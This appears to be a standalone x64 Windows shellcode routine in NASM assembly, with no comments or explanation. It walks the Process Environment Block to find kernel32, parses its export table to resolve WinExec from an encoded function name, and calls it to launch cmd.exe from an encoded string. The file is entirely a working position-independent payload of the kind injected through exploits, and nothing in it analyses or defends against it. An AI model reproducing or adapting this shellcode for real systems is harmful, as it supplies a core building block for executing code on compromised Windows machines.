section .text
global main

main:
    sub rsp, 40

    xor rax, rax
    mov rbx, [gs:0x60]
    mov rbx, [rbx + 0x18]
    mov rbx, [rbx + 0x20]
    
    mov rbx, [rbx]
    mov rbx, [rbx]
    
    mov r12, [rbx + 0x20]

    mov eax, [r12 + 0x3c]
    add rax, r12
    
    mov eax, [rax + 0x88]
    add rax, r12
    mov r13, rax

    mov ecx, [r13 + 0x18]
    mov edi, [r13 + 0x20]
    add rdi, r12

find_function:
    dec ecx
    mov esi, [rdi + rcx*4]
    add rsi, r12
    
    mov rax, 0x636578456e6957
    cmp [rsi], rax
    jnz find_function

    mov edi, [r13 + 0x24]
    add rdi, r12
    movzx ecx, word [rdi + rcx*2]

    mov edi, [r13 + 0x1c]
    add rdi, r12
    
    mov eax, [rdi + rcx*4]
    add rax, r12
    mov r15, rax

    xor rdx, rdx
    push rdx
    
    mov rax, 0x6578652e646d63
    push rax
    
    mov rcx, rsp
    mov rdx, 1

    sub rsp, 32
    call r15

    add rsp, 48
    add rsp, 40
    ret